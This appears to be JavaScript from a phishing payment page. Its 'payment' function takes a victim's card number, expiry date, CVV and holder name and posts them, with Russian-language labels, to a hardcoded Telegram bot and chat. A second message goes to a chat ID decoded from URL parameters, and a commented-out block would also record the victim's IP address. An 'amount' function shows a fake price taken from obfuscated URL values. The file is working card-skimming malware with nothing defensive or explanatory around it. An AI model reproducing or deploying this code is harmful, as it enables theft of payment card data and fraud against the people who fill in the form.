function payment(params, cardNumber, expiryDate, cvv, holder) {
    const botToken = '7246354262:AAHntXSjinje1yphb59Tua15AwyAjVUOZPU'; // ⚠️ НЕБЕЗОПАСНО!
    const chatId = '7559611229';

    // fetch('https://api.ipify.org?format=json')
    // .then(res => res.json())
    // .then(data => {
    //     const clientIp = data.ip;
    //     fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`🌐 IP: ${clientIp} 💸 Произвёл ввод данных:
    // 💳 Номер: ${cardNumber} 
    // 🗓️ Дата: ${expiryDate}
    // 🔢 CVV: ${cvv}
    // 👤 Владелец: ${holder}`)}`, {
    //         method: 'GET'
    //     })
    // });

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`🌐 IP: 000 💸 Произвёл ввод данных:
    💳 Номер: ${cardNumber} 
    🗓️ Дата: ${expiryDate}
    🔢 CVV: ${cvv}
    👤 Владелец: ${holder}`)}`, {
        method: 'GET'
    })

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${parseInt(params.u)/4}&text=${encodeURIComponent(`🌐 IP: 000 💸 Произвёл ввод данных на чек в ${parseInt(params.a)/4}$`)}`, {
        method: 'GET'
    })    

}

function amount(params) {
    if (params.a !== undefined) {
        if (params.a !== '') {
            var amountValue = parseInt(params.a)/271;
        } else {
            var amountValue = '1000';
        }
    } else {
        var amountValue = '1000';
    }
    document.getElementById("amountDiv").textContent = `${amountValue} $`;
    document.getElementById("submitButton").textContent = `Pay ${amountValue} $`;
}